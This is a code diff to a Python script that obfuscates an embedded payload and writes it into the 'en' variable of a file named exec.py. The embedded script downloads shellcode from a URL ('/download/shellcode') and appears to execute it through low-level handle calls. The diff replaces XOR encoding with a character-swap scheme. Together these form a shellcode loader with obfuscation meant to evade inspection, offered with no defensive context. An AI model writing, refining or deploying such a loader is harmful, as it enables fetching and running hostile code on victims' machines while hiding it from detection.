@@ -1,11 +1,15 @@
-def cu(data):
+def custom_encode(data):
+   
+    char_mapping = {'a': 'd', 'd': 'a', 'k': 'L', 'L': 'k', ')': 'n','n': ')'}  
+    
     encoded_data = ""
     for char in data:
-        encoded_data += chr(ord(char) ^ Y)  # Perform XOR operation
+        encoded_char = char_mapping.get(char, char)  
+        encoded_data += encoded_char
     return encoded_data
 
-Y = 0xFF
-# Custom encoded script
+
+
 
 script = f"""
 static_url = "http://127.0.0.1:8080/download/shellcode"
@@ -33,25 +37,22 @@ v(hndl, kk.c_uint32(0xffffffff))
 """
 
 # Decode the script
-encoded_script = cu(script)
+encoded_script = custom_encode(script)
 
 # Execute the decoded script
 print(encoded_script )
 
-with open('exec.py', 'r',encoding='utf-8') as file:
-            file_content = file.read()
 
-            
-lines = file_content.split('\n')
-updated_lines = []
-for line in lines:
-    if 'en=' in line:
-        parts = line.split('"""')
-        if len(parts) >= 2:
-            parts[1] = encoded_script  # Update the URL with the obfuscated value
-            line = '"""'.join(parts)
-    updated_lines.append(line)
+with open('exec.py', 'r', encoding='utf-8') as file:
+    file_content = file.read()
 
-updated_content = '\n'.join(updated_lines)
+# Find the index of the start and end of the `en` variable content
+start_index = file_content.find('en="""') + len('en="""')
+end_index = file_content.find('"""', start_index)
+
+# Replace the content of the `en` variable with the encoded script
+updated_content = file_content[:start_index] + encoded_script + file_content[end_index:]
+
+# Write the updated content back to the file
 with open('exec.py', 'w', encoding='utf-8') as file:
     file.write(updated_content)
